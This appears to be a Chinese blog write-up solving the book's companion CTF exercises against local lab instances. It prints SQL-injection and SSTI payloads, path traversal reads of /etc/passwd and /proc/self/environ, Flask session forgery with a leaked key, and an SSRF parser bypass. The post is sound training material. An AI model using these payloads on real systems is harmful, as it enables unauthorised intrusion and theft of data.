---
title: 《从0到1：CTFer成长之路》配套题目
date: 2021-03-13 09:47:57
tags: 
      - 网络安全
categories: 《从0到1：CTFer成长之路》
---

官方平台网址：https://book.nu1l.com/tasks/

<!--more-->

# 第一章 Web 入门
## 1.1 信息搜集
### 1.1.1 常见的搜集
1. 先使用目录扫描工具 [dirsearch](https://github.com/maurosoria/dirsearch) 扫描`127.0.0.1`网站，获得网站目录
```
200    10KB  http://127.0.0.1:80/.DS_Store
403   274B   http://127.0.0.1:80/.ht_wsr.txt
403   274B   http://127.0.0.1:80/.htaccessBAK
403   274B   http://127.0.0.1:80/.htaccess.bak1
403   274B   http://127.0.0.1:80/.htaccessOLD
403   274B   http://127.0.0.1:80/.htaccess.orig
403   274B   http://127.0.0.1:80/.htaccess.sample
403   274B   http://127.0.0.1:80/.htaccess.save
403   274B   http://127.0.0.1:80/.htaccess_extra
403   274B   http://127.0.0.1:80/.htaccess_orig
403   274B   http://127.0.0.1:80/.htaccess_sc
403   274B   http://127.0.0.1:80/.htm
403   274B   http://127.0.0.1:80/.html
403   274B   http://127.0.0.1:80/.htpasswd_test
403   274B   http://127.0.0.1:80/.htpasswds
403   274B   http://127.0.0.1:80/.httr-oauth
200    12KB  http://127.0.0.1:80/.index.php.swp
403   274B   http://127.0.0.1:80/.htaccessOLD2
200     2KB  http://127.0.0.1:80/index.php
200     2KB  http://127.0.0.1:80/index.php/login/
200     2KB  http://127.0.0.1:80/index.php~
200    47B   http://127.0.0.1:80/robots.txt
403   274B   http://127.0.0.1:80/server-status
403   274B   http://127.0.0.1:80/server-status/
```
2. 发现存在可疑文件：
```
robots.txt   # 常规文件
index.php~   # gedit 备份文件
.index.php.swp  # vim 备份文件
```
1. 根据书中方法一一查验可得 flag

### 1.1.2 粗心的小李
1. 先使用 目录扫描工具 dirsearch 扫描 127.0.0.1 文件信息，获得下列文件目录
```
200     5B   http://127.0.0.1:80/.git/COMMIT_EDITMSG
403   274B   http://127.0.0.1:80/.git/
301   305B   http://127.0.0.1:80/.git    -> REDIRECTS TO: http://127.0.0.1/.git/
200    23B   http://127.0.0.1:80/.git/HEAD
200    73B   http://127.0.0.1:80/.git/description
200   137B   http://127.0.0.1:80/.git/config
403   274B   http://127.0.0.1:80/.git/hooks/
200   240B   http://127.0.0.1:80/.git/info/exclude
403   274B   http://127.0.0.1:80/.git/info/
200   145B   http://127.0.0.1:80/.git/index
200   148B   http://127.0.0.1:80/.git/logs/HEAD
403   274B   http://127.0.0.1:80/.git/logs/
301   315B   http://127.0.0.1:80/.git/logs/refs    -> REDIRECTS TO: http://127.0.0.1/.git/logs/refs/
301   321B   http://127.0.0.1:80/.git/logs/refs/heads    -> REDIRECTS TO: http://127.0.0.1/.git/logs/refs/heads/
200   148B   http://127.0.0.1:80/.git/logs/refs/heads/master
403   274B   http://127.0.0.1:80/.git/objects/
403   274B   http://127.0.0.1:80/.git/refs/
200    41B   http://127.0.0.1:80/.git/refs/heads/master
301   316B   http://127.0.0.1:80/.git/refs/heads    -> REDIRECTS TO: http://127.0.0.1/.git/refs/heads/
301   315B   http://127.0.0.1:80/.git/refs/tags    -> REDIRECTS TO: http://127.0.0.1/.git/refs/tags/
403   274B   http://127.0.0.1:80/.ht_wsr.txt
403   274B   http://127.0.0.1:80/.htaccess.bak1
403   274B   http://127.0.0.1:80/.htaccess.orig
403   274B   http://127.0.0.1:80/.htaccess.save
403   274B   http://127.0.0.1:80/.htaccess.sample
403   274B   http://127.0.0.1:80/.htaccessBAK
403   274B   http://127.0.0.1:80/.htaccessOLD
403   274B   http://127.0.0.1:80/.htaccessOLD2
403   274B   http://127.0.0.1:80/.htaccess_extra
403   274B   http://127.0.0.1:80/.htaccess_orig
403   274B   http://127.0.0.1:80/.htaccess_sc
403   274B   http://127.0.0.1:80/.htm
403   274B   http://127.0.0.1:80/.html
403   274B   http://127.0.0.1:80/.htpasswd_test
403   274B   http://127.0.0.1:80/.htpasswds
403   274B   http://127.0.0.1:80/.httr-oauth
200     2KB  http://127.0.0.1:80/index.html
403   274B   http://127.0.0.1:80/server-status/
403   274B   http://127.0.0.1:80/server-status
```
2. 发现存在`.git`文件夹，试探访问`.git/config`，返回了下列内容，说明存在 git 泄露。
```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
```

3. 使用 [scrabble](https://github.com/denny0223/scrabble) 工具，成功获到源码，拿到 flag。


## 1.2 SQL注入
### 1.2.1 SQL注入-1
1. 127.0.0.1/index.php?id=2-1 的结果与 127.0.0.1/index.php?id=2 相同，说明不存在数字型注入。

2. 尝试 127.0.0.1/index.php?id=2-1%27%23，发现页面有显示内容，说明是字符型注入。
  
3. 尝试 UNION 注入，127.0.0.1/index.php?id=-1%27%23union%20select%201,2,3%23，发现成功返回数据。说明是 select 1,2,3 形式，并且1不会显示，3是用户输入的数据，2是数据库数据。
  
4. 尝试获取表明 127.0.0.1/index.php?id=-1%27union%20select%201,group_concat(table_name),1%20from%20information_schema.tables%20where%20table_schema=database()%23，得到 fl4g，notes 两个表。
  
5. 分别尝试获取列名。127.0.0.1/index.php?id=-1%27union%20select%201,group_concat(column_name),1%20from%20information_schema.columns%20where%20table_name=%27fl4g%27%23。在 fl4g 中获得 flag。

### 1.2.2 SQL注入-2 
1. 访问 127.0.0.1，服务器返回 Forbidden，说明入口错误。尝试使用 dirsearch 工具扫描目录，发现 login.php、user.php 状态是200，找到入口。
```
200     2KB  http://127.0.0.1:80/login.php
403   289B   http://127.0.0.1:80/server-status
403   290B   http://127.0.0.1:80/server-status/
200    11B   http://127.0.0.1:80/user.php
```

2. 访问 http://127.0.0.1:80/login.php ，随机使用账号密码登录，未发现异常。查看源码，发现注释中有提示：`如果觉得太难了，可以在url后加入?tips=1 开启mysql错误提示,使用burp发包就可以看到啦`
  
3. 安装 burp suit 社区版
  下载链接：https://portswigger.net/burp/releases/professional-community-2021-2-1
  安装命令：`sh burpsuite_community_linux_v2021_2_1.sh` 

4. 配置 burp suit
> 1. 进入 Proxy ->  option，选择 add，端口用 8080，选择  Loopback only。
> 2. 进入浏览器的代理设置，http/https 代理均设为 127.0.0.1，端口 8080。(与 burp 内设置的一致)
![burp proxy](burp_proxy.png)

5. 使用 burp suit 抓包、发包。
> 进入 Proxy -> intercep 页面。如果浏览器与 burp 设置成功，浏览器发出的包会先到 burp，burp 中可对这个包执行修改、转发、丢弃等等操作。在 intercep 这行一系列对包的操作。
![burp intercept](burp_intercept.png)

6. 火狐浏览器会自动周期性的发包，可先在火狐浏览器核心设置中取消这周期性的发包，具体发的包可以 burp 中 Proxy菜单下的 HTTP history 页面中看到。
   
7. burp 有时不会捕获 127.0.0.1 的流量。如果要捕获发至本机的包，使用 `ifconfig` 命令先找到本机的 ip，用本机的 ip 代替 127.0.0.1 访问，成功捕获。我的主机 ip 是 172.19.0.1。

8. burp 捕获访问 http://172.19.0.1/login.php 的包（注意此处需要捕获的是输入账号密码点击登录后产生的包），在 intercep 页面 request 栏右键选择 action：`Send to Repeater（Ctrl + R）`，再进入 Repeater 页面。在 request 中修改请求头。
   
9.  根据提示，先在 post 的 url 中添加 ?tips=1，发送后发现无有效信息。于是修改 name，由原来的 123 改为 123'（登录的用户名），成功返回 SQL 报错信息：
> string(154) "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''123''' at line 1"
> ![burp login request](burp_login_request.png)

10. 可能存在报错注入，于是使用 updatexml 函数。继续修改 request 中请求头信息：
> `name=123'or updatexml(1,concat(0x7e,(select(7,8,9)),0x7e),1)#&pass=123`

    返回报错内容：string(34) "Operand should contain 1 column(s)"

    可能只有1列，尝试 `name=123'or updatexml(1,concat(0x7e,(select(7)),0x7e),1)#&pass=123`

    返回报错内容：`~7~`。确定格式。（0x7e：~ ）

11. 使用完整 SQL 语句测试：`name=123'or updatexml(1,concat(0x7e,(select(7) from dual ),0x7e),1)#&pass=123`,返回如下 SQL 错误。根据报错信息，说明可能存在关键字的替换，最有可能替换的是 select ,于是使用嵌套 select，即 seselectlect 替换 select，再次成功返回信息`~7~`。
> string(164) "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'from dual)),1)#'' at line 1"

12. 通过获取表名，列名成功获得 flag。
```
name=test'and updatexml(1,concat(0x7e,(seselectlect group_concat(table_name) from information_schema.tables where table_schema=database()) ,0x7e),1)#&pass=xxxx

string(34) "XPATH syntax error: '~fl4g,users~'"
```
```
name=test'and updatexml(1,concat(0x7e,(seselectlect group_concat(column_name) from information_schema.columns where table_name='fl4g'),0x7e),1)#&pass=xxxx

# 返回信息：string(28) "XPATH syntax error: '~flag~'"
```

## 1.3 任意文件读取漏洞
### 1.3.1 afr_1
1. 访问本机 ip(172.19.0.1) 进入环境，发现重定向至了 ?p=hello，联想书中"病者多诡(HCTF 2016)"，很有可能类似，猜测存在 include 函数，p 可能是 page。
   
2. 使用 wappalyzer 插件获得网站的 Banner 信息，确定是 php。
   ![wappalyzer](afr_1_wappalyzer.png)

3. 使用 dirsearch 进行目录扫描，发现存在 index.php，且重定向至 ?p=hello
4. 于是尝试访问 `http://172.19.0.1/index.php`，重定向至了`http://172.19.0.1/?p=hello`，而访问`http://172.19.0.1/?p=index`则是报错。
   
5. 尝试使用 php 的 filter 获取 index.php,`http://172.19.0.1/?p=php://filter/read=convert.Base64-encode/resource=index`,获得数据`PD9waHAKCmlmKGlzc2V0KCRfR0VUWydwJ10pKSB7CiAgICBpbmNsdWRlIChzdHJpbmcpJF9HRVRbJ3AnXSAuICIucGhwIjsKfQplbHNlewogICAgaGVhZGVyKCdMb2NhdGlvbjogLz9wPWhlbGxvJyk7Cn0=`，解码后得
  ```
  <?php
  if(isset($_GET['p'])) {
    include (string)$_GET['p'] . ".php";
  }
  else{
    header('Location: /?p=hello');
  }
  ```

6. 清楚了逻辑，直接尝试 `flag.php`,即`http://172.19.0.1/?p=php://filter/read=convert.Base64-encode/resource=flag`,获得数据`PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9`，解码得
  ```
  <?php
  die('no no no');
  //n1book{afr_1_solved}
  ```
  明显注释中可能表示 flag，查看官方 write up:`http://172.19.0.1/?p=php://filter/convert.base64-encode/resource=flag`，确定无错。

7. php://协议 Filter解读： `?p=php://filter/read=convert.Base64-encode/resource=flag`
   - 这是 p 关键字得 get 传递，即p=****
   - php://是一种协议名称，php://filter/ 是一种访问本地文件的协议
   - read=convert.Base64-encode 表示文件流编码成 Base64 的形式，这样读取的内容就不会存在 PHP 标签
   - /resource=flag 表示目标文件是 flag.php

### 1.3.2 afr_2
1. 访问环境，使用 wappalyzer 插件获得网站的 Banner 信息,发现服务器使用的 Nginx
   ![wappalyzer](afr_2_wappalyzer.png)
2. 使用 dirsearch 进行目录扫描，发现`/img`目录可以直接访问
   ```
    301   194B   http://172.19.0.1:80/img    -> REDIRECTS TO: http://172.19.0.1/img/
    200    99B   http://172.19.0.1:80/index.html
   ```
3. 想起 Nginx 错误配置造成的目录穿越漏洞，使用访问路径`/img../`，获得 flag。

### 1.3.3 afr_3
- 【知识点】:
  - 任意文件读取
  - flask SSTI 模板注入
    - [flask之ssti模版注入从零到入门](https://xz.aliyun.com/t/3679)
  - session 伪造
    - [flask session 伪造](https://blog.csdn.net/DonkeyMoon/article/details/109690476)
    - [[HCTF 2018]admin 1](https://blog.csdn.net/rfrder/article/details/109188719)
    - [N1BOOK 入门session伪造](https://blog.csdn.net/SopRomeo/article/details/111186821?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&dist_request_id=1328680.24088.16162219708244293&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control)

1. `172.19.0.1:5000` 访问本题环境，在 `your name`框键入`test`，点`提交`。
   
2. 跳转到了`http://172.19.0.1:5000/n1page`,并且页面显示：`Hello : test, why you don't look at our article?`，点击 `article` 跳转到了`http://172.19.0.1:5000/article?name=article`

3. 注意到 url 中有参数 name,`name=article`,尝试随意赋值 name，页面回显：`[Errno 2] No such file or directory: '/home/nu11111111l/articles/article1'`，获得路径信息，并且很有可能是 linux 服务器，其实在 wappalyzer 中有检测出是 ubuntu

4. 尝试文件读取漏洞中常见的读取路径。先尝试 `/etc/passwd`，即`http://172.19.0.1:5000/article?name=/../../../etc/passwd`,成功回显`passwd`文件信息。研究了下 linux 的 passwd，没发现特殊的信息，继续尝试其他路径。
```
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin 
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
```

5. 尝试 `/proc/self/cmdline`,，即`http://172.19.0.1:5000/article?name=/../../../proc/self/cmdline`，获得回显信息：`pythonserver.py`,获得题目是 python 的服务器。

6. 尝试在 `environ` 查看环境变量，即`http://172.19.0.1:5000/article?name=/../../../proc/self/environ`,获得环境变量,得知`server.py` 在 `/home/sssssserver`路径下。
   > HOSTNAME=c0b8f0d6cb78HOME=/rootPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPWD=/home/sssssserver

7. 直接访问`server.py`，即`http://172.19.0.1:5000/article?name=/../../../home/sssssserver/server.py`,成功回显 `server.py` 源码。（server.py 可以通过`/proc/self/cwd`进入当前应用所在目录直接获得，即`http://172.19.0.1:5000/article?name=/../../../proc/self/cwd/server.py`）
```python
#!/usr/bin/python
import os
from flask import (Flask, render_template, request, url_for, redirect, session, render_template_string)
from flask_session import Session

app = Flask(__name__)

# execfile() 函数可以用来执行一个文件。
execfile('flag.py')
execfile('key.py')
FLAG = flag

# 在flask项目中，Session, Cookies以及一些第三方扩展都会用到SECRET_KEY值，这是一个比较重要的配置值。
app.secret_key = key

# 访问 host/n1page 时会进入此方法
@ app.route("/n1page", methods=["GET", "POST"])
def n1page():
	if request.method != "POST":
		return redirect(url_for("index"))

	n1code = request.form.get("n1code") or None

	# 过滤
	if n1code is not None:
		n1code = n1code.replace(".", "").replace("_", "").replace("{", "").replace("}", "")

	if "n1code" not in session or session['n1code'] is None:
		session['n1code'] = n1code

	template = None

	if session['n1code'] is not None:
		template = '''
			<h1>N1 Page</h1> <div class="row> 
			<div class="col-md-6 col-md-offset-3 center"> 
			Hello : %s, why you don't look at our <a href='/article?name=article'>article</a>?
			 </div> </div> ''' % session['n1code']

	session['n1code'] = None
	return render_template_string(template) @ app.route("/", methods=["GET"])


def index():
	return render_template("main.html")


@ app.route('/article', methods=['GET'])
def article():
	error = 0
	if 'name' in request.args:
    	page = request.args.get('name')
	else:
    	page = 'article'

	if page.find('flag') >= 0:
		page = 'notallowed.txt'

	try:
    	template = open('/home/nu11111111l/articles/{}'.format(page)).read()
	except Exception as e:
    	template = e
	return render_template('article.html', template=template)

if __name__ == "__main__":
	app.run(host='0.0.0.0', debug=False)
```

8. 在 pycharm 中搭建环境，通过阅读源码知目录下有 `flag.py`，直接访问发现没有权限。继续阅读源码，发现`n1page`方法中存在模板注入，但是存在过滤
```python
	if n1code is not None:
		n1code = n1code.replace(".", "").replace("_", "").replace("{", "").replace("}", "")
```

  不过在接下来的对 session[`n1code`] 仅仅是简单判定是否为空，可以利用 falsk 的 session 伪造实现注入。
```python
  if session['n1code'] is not None:
	template = '''
		<h1>N1 Page</h1> <div class="row> 
		<div class="col-md-6 col-md-offset-3 center"> 
		Hello : %s, why you don't look at our <a href='/article?name=article'>article</a>?
		 </div> </div> ''' % session['n1code']
```

9. 首先通过代码的逻辑，程序进入`n1page`方法，也就是访问`host/n1page`的时候，所以应该是抓访问`http://172.19.0.1:5000/n1page`的包。
  ![afr3](afr3_n1page_session.png)

10. 获取这个包的 session，然后使用解码函数解密，确定 session 字符串形式`{'n1code': None}`，需要构造 payload 去替换 none。
```python
#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                         'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                             'decoding the payload')

    return session_json_serializer.loads(payload)

if __name__ == '__main__':
    # 由于我是在 pycharm 运行，为了方便直接将 session 赋值给 payload
    payload = "eyJuMWNvZGUiOm51bGx9.YFVHSw.M_DdKDNd7WMbknyVKSDJ9Y25Z7Q"
    print(decryption(payload.encode()))
    # print(decryption(sys.argv[1].encode())) 
```
> {'n1code': None}

11. flask的 session 伪造需要一个密钥。接下来需要获得`SECRET_KEY`。在 server.py 源码中有执行 key.py 文件的操作，即`execfile('key.py')`，所以尝试直接访问`key.py`，成功获得内容：#!/usr/bin/python key = 'Drmhze6EPcv0fN_81Bj-nA'

12. 接下来是构造 payload。使用知识点中列的博文里的 payload 很多都失败了，我最终成功的形式：`{{[].__class__.__mro__[1].__subclasses__()[40](\'flag.py\').read()}}'}"`，使用`flask-session-cookie-manager`完整的命令形式：`python3 flask_session_cookie_manager3.py encode -s "Drmhze6EPcv0fN_81Bj-nA" -t "{'n1code' : '{{[].__class__.__mro__[1].__subclasses__()[40](\'flag.py\').read()}}'}"`
   - flask-session-cookie-manager：Flask Session Cookie Decoder/Encoder，可以用来对 flask session cookie 编码/解码，实际上第10步也可以用这个来解码
   - `Drmhze6EPcv0fN_81Bj-nA`，从 key.py 中获得的密钥
   - 整个流程：1. 先对原始 session 解码获得 session 的形式  2. 获取`SECRET_KEY`  3. 构造 payload  4. 按照解码获得 session 的形式构造 session，再通过`flask-session-cookie-manager`使用 key 加密编码。

13. 将`flask-session-cookie-manager`获得的编码放到请求包的 session 中，再向服务器发送该包，成功获得 flag.py
    ![afr](afr_3_flag.png)


# 第二章 Web 进阶
## 2.1 SSRF漏洞
1.  进入环境，点击 intersting challenge，代码审计。更详细的代码审计可以看这篇[博客](https://blog.csdn.net/wuyaowangchuan/article/details/110433971)
```php
<?php 
highlight_file(__FILE__);  # 高亮显示当前文件
function check_inner_ip($url) 
{ 
    $match_result=preg_match('/^(http|https)?:\/\/.*(\/)?.*$/',$url); 
    // ^ 匹配行的开始
    // (xyz) 字符组，按照确切的顺序匹配字符 xyz
    // | 分支结构，匹配符号之前的字符或后面的字符
    // ? 	匹配前面的子表达式零次或一次，或指明一个非贪婪限定符
    // \ 转义符，它可以还原元字符原来的含义，允许你匹配保留字符 [ ] ( ) { } . * + ? ^ $ \ |
    // . 匹配除换行符以外的任意字符
    // * 匹配前面的子表达式零次或多次
    // $ 匹配行的结束

    if (!$match_result) 
    { 
        die('url fomat error'); 
    } 
    try 
    { 
        $url_parse=parse_url($url); 
        // 分解出一个URL的各个部分，返回数组。这是 php 的方法，各种语言对 URL 各部分解析规则会各不一样
    } 
    catch(Exception $e) 
    { 
        die('url fomat error'); 
        return false; 
    } 
    $hostname=$url_parse['host']; 
    $ip=gethostbyname($hostname); 
    $int_ip=ip2long($ip); 
    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16; 
} 

function safe_request_url($url) 
{ 
     
    if (check_inner_ip($url)) 
    { 
        echo $url.' is inner ip'; 
    } 
    else 
    {
        $ch = curl_init();  # 初始化
        curl_setopt($ch, CURLOPT_URL, $url); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_HEADER, 0); 
        $output = curl_exec($ch);  #  //抓取URL并把它传递给浏览器，实际上由于解析规则，获得的域名与 php parse_url 方法获得的不一样
        $result_info = curl_getinfo($ch); 
        if ($result_info['redirect_url']) 
        { 
            safe_request_url($result_info['redirect_url']); 
        } 
        curl_close($ch); 
        var_dump($output); 
    } 
     
} 

$url = $_GET['url']; 
if(!empty($url)){ 
    safe_request_url($url); 
} 

?>
```

2. URL 都要经过 check_inner_ip 函数检测，但 php_url_parse 和 curl 对 url 的解析是不同的，强烈看看这篇文章 [【Blackhat】SSRF的新纪元：在编程语言中利用URL解析器](https://www.anquanke.com/post/id/86527)
    ![ssrf](ssrf_1_url.png)

3. 直接构造`?url=http://a@127.0.0.1:80@baidu.com/flag.php`

4. 后续还有 MySQL、Redies，我是跟着这个博客做的 [《从0到1：CTFer成长之路》 配套题目Web WP](https://blog.csdn.net/rfrder/article/details/108930033?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161604810616780255279438%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161604810616780255279438&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108930033.pc_search_result_cache&utm_term=%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF\)
   1. 查看已经运行的docker镜像 `sudo docker ps -a`
   2. 连接到mysql镜像中 `sudo docker exec -it 2-web-ssrf_mysql_1 bash`,2-web-ssrf_mysql_1 在上一步查看镜像时 NAMES 的内容。[怎么访问docker内的MySQL](https://www.php.cn/docker/445365.html)
   - 将 docker 容器中的文件传递到主机:`sudo docker cp 2-web-ssrf_mysql_1:/pcap/mysql.pcap /home/chang/`

## 2.2 命令执行漏洞
这道题主要是看博文，弄懂 linux文件描述符 和 反弹shell原理再看 writeup 基本上没什么难度了。
- [《从0到1：CTFer成长之路》 配套题目Web WP](https://blog.csdn.net/rfrder/article/details/108930033?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161604810616780255279438%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161604810616780255279438&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108930033.pc_search_result_cache&utm_term=%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF\)
- [反弹Shell原理及检测技术研究](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_1_1)
- [彻底弄懂 Linux 下的文件描述符（fd）](https://cs-cshi.github.io/2021/03/23/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/)